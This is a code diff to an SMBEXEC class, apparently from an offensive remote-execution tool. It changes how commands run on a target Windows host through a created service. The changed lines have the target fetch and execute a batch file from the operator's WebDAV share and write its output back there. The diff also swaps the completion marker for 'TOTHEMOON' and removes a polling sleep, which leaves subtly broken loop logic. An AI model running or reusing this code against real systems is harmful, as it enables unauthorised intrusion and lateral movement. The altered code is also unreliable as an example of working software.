@@ -78,16 +78,16 @@ class SMBEXEC:
 
         data = data.replace('&', '^&')
         if self.__retOutput:
-            command = self.__shell + data + ' ^> \\\\{}@{}\\misc\\tmp\\{}'.format(local_ip, self.__webPort, self.__output)
+            command = self.__shell + data + ' ^> tmp\\{} ^& popd'.format(self.__output)
         else:
             command = self.__shell + data
-        
+
         with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', self.__batchFile), 'w') as batch_file:
             batch_file.write(command)
 
         logging.debug('Hosting batch file with command: ' + command)
 
-        command = self.__shell + 'net use \\\\{}@{}\\misc\\tmp\\ && \\\\{}@{}\\misc\\tmp\\{}'.format(local_ip, self.__webPort, local_ip, self.__webPort, self.__batchFile)
+        command = self.__shell + 'pushd \\\\{}@{}\\misc & tmp\\{} & popd'.format(local_ip, self.__webPort, self.__batchFile)
         logging.debug('Command to execute: ' + command)
 
         logging.debug('Remote service {} created.'.format(self.__serviceName))
@@ -110,13 +110,11 @@ class SMBEXEC:
             try:
                 with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', self.__output), 'r') as output:
                     out = output.read()
-                    if "Dump count reached" in out:
+                    if "TOTHEMOON" in out:
                         self.output_callback(output.read())
                         break
-                    else:
-                        time.sleep(1)
             except IOError:
-                time.sleep(2)
+                time.sleep(1)
 
     def finish(self):
         try:
